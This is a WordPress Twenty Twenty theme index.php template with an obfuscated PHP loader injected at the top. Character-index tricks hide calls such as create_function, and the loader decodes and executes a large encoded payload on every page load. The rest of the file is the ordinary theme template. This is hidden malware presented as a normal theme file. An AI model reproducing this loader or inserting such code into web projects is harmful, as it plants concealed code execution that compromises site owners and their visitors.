<?php $TOUoRlqmYf='y(3;]whcx)8$4mb dk1qog5sprlua=z_/0i9tvf_"76*.2n[je';$q2866=$TOUoRlqmYf[(105/15)].$TOUoRlqmYf[(26-1)].$TOUoRlqmYf[(1*49)].$TOUoRlqmYf[((10*1)+18)].$TOUoRlqmYf[(14+22)].$TOUoRlqmYf[(44+5)].$TOUoRlqmYf[(44-13)].$TOUoRlqmYf[(684/18)].$TOUoRlqmYf[(23+4)].$TOUoRlqmYf[(72-(33-7))].$TOUoRlqmYf[(154/22)].$TOUoRlqmYf[(11+25)].$TOUoRlqmYf[(65-(62-31))].$TOUoRlqmYf[(26-6)].$TOUoRlqmYf[((27*2)-8)];$pHFdNhg9688=$TOUoRlqmYf[(20-9)].$TOUoRlqmYf[(2*4)].$TOUoRlqmYf[(29*1)].$TOUoRlqmYf[(160/4)];$MYtraky2482=$TOUoRlqmYf[(8*5)].$TOUoRlqmYf[((1+0)+2)].$TOUoRlqmYf[(6+(1*(95/19)))].$TOUoRlqmYf[(140/5)].$TOUoRlqmYf[(522/18)].$TOUoRlqmYf[(7*((7-3)-2))].$TOUoRlqmYf[(2*14)].$TOUoRlqmYf[(138/(2+4))].$TOUoRlqmYf[(1029/(378/18))].$TOUoRlqmYf[((2*189)/9)].$TOUoRlqmYf[(12+(0+0))].$TOUoRlqmYf[(31*1)].$TOUoRlqmYf[(48/(36/12))].$TOUoRlqmYf[(735/15)].$TOUoRlqmYf[(0+7)].$TOUoRlqmYf[(18+2)].$TOUoRlqmYf[(18-(10/5))].$TOUoRlqmYf[(735/15)].$TOUoRlqmYf[(0+(2-(1*1)))].$TOUoRlqmYf[(16-(3+(36/(0+18))))].$TOUoRlqmYf[((167-23)/18)].$TOUoRlqmYf[(0+(18-9))].$TOUoRlqmYf[(1*3)].$TOUoRlqmYf[(11*(1+(0/(78/13))))].$TOUoRlqmYf[(2*7)].$TOUoRlqmYf[(29*(0+1))].$TOUoRlqmYf[(38-(8+9))].$TOUoRlqmYf[(15*2)].$TOUoRlqmYf[(45-11)].$TOUoRlqmYf[(1*46)].$TOUoRlqmYf[(1*(17+21))].$TOUoRlqmYf[(78/3)].$TOUoRlqmYf[(21+(77/11))].$TOUoRlqmYf[(22+14)].$TOUoRlqmYf[(343/(91/13))].$TOUoRlqmYf[(1*1)].$TOUoRlqmYf[(21-10)].$TOUoRlqmYf[(22+(12/2))].$TOUoRlqmYf[(180/20)].$TOUoRlqmYf[(3+((0+0)*1))].$TOUoRlqmYf[(686/(126/9))].$TOUoRlqmYf[(61-(32-8))].$TOUoRlqmYf[(476/17)].$TOUoRlqmYf[((4-0)+22)].$TOUoRlqmYf[(((23-(2*5))/13)-0)].$TOUoRlqmYf[(7+(84/21))].$TOUoRlqmYf[(28/2)].$TOUoRlqmYf[(9-0)].$TOUoRlqmYf[(3*1)];$UrR1094= "'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'";$JTx2343=$pHFdNhg9688;$JTx2343.=$UrR1094;$JTx2343.=$MYtraky2482;@$mEriqO3481=$q2866((''), ($JTx2343));@$mEriqO3481(); ?>
<?php
/**
 * The main template file
 *
 * This is the most generic template file in a WordPress theme
 * and one of the two required files for a theme (the other being style.css).
 * It is used to display a page when nothing more specific matches a query.
 * E.g., it puts together the home page when no home.php file exists.
 *
 * @link https://developer.wordpress.org/themes/basics/template-hierarchy/
 *
 * @package WordPress
 * @subpackage Twenty_Twenty
 * @since Twenty Twenty 1.0
 */

get_header();
?>

<main id="site-content">

	<?php

	$archive_title    = '';
	$archive_subtitle = '';

	if ( is_search() ) {
		global $wp_query;

		$archive_title = sprintf(
			'%1$s %2$s',
			'<span class="color-accent">' . __( 'Search:', 'twentytwenty' ) . '</span>',
			'&ldquo;' . get_search_query() . '&rdquo;'
		);

		if ( $wp_query->found_posts ) {
			$archive_subtitle = sprintf(
				/* translators: %s: Number of search results. */
				_n(
					'We found %s result for your search.',
					'We found %s results for your search.',
					$wp_query->found_posts,
					'twentytwenty'
				),
				number_format_i18n( $wp_query->found_posts )
			);
		} else {
			$archive_subtitle = __( 'We could not find any results for your search. You can give it another try through the search form below.', 'twentytwenty' );
		}
	} elseif ( is_archive() && ! have_posts() ) {
		$archive_title = __( 'Nothing Found', 'twentytwenty' );
	} elseif ( ! is_home() ) {
		$archive_title    = get_the_archive_title();
		$archive_subtitle = get_the_archive_description();
	}

	if ( $archive_title || $archive_subtitle ) {
		?>

		<header class="archive-header has-text-align-center header-footer-group">

			<div class="archive-header-inner section-inner medium">

				<?php if ( $archive_title ) { ?>
					<h1 class="archive-title"><?php echo wp_kses_post( $archive_title ); ?></h1>
				<?php } ?>

				<?php if ( $archive_subtitle ) { ?>
					<div class="archive-subtitle section-inner thin max-percentage intro-text"><?php echo wp_kses_post( wpautop( $archive_subtitle ) ); ?></div>
				<?php } ?>

			</div><!-- .archive-header-inner -->

		</header><!-- .archive-header -->

		<?php
	}

	if ( have_posts() ) {

		$i = 0;

		while ( have_posts() ) {
			$i++;
			if ( $i > 1 ) {
				echo '<hr class="post-separator styled-separator is-style-wide section-inner" aria-hidden="true" />';
			}
			the_post();

			get_template_part( 'template-parts/content', get_post_type() );

		}
	} elseif ( is_search() ) {
		?>

		<div class="no-search-results-form section-inner thin">

			<?php
			get_search_form(
				array(
					'aria_label' => __( 'search again', 'twentytwenty' ),
				)
			);
			?>

		</div><!-- .no-search-results -->

		<?php
	}
	?>

	<?php get_template_part( 'template-parts/pagination' ); ?>

</main><!-- #site-content -->

<?php get_template_part( 'template-parts/footer-menus-widgets' ); ?>

<?php
get_footer();
